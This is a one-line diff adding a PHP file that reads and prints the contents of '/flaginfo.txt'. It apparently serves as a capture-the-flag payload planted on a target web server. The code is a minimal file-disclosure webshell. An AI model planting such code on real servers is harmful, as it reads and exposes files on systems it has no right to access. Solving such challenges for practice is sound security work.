@@ -1,0 +1,1 @@
+<?php echo fgets(fopen("/flaginfo.txt", "r"));?>
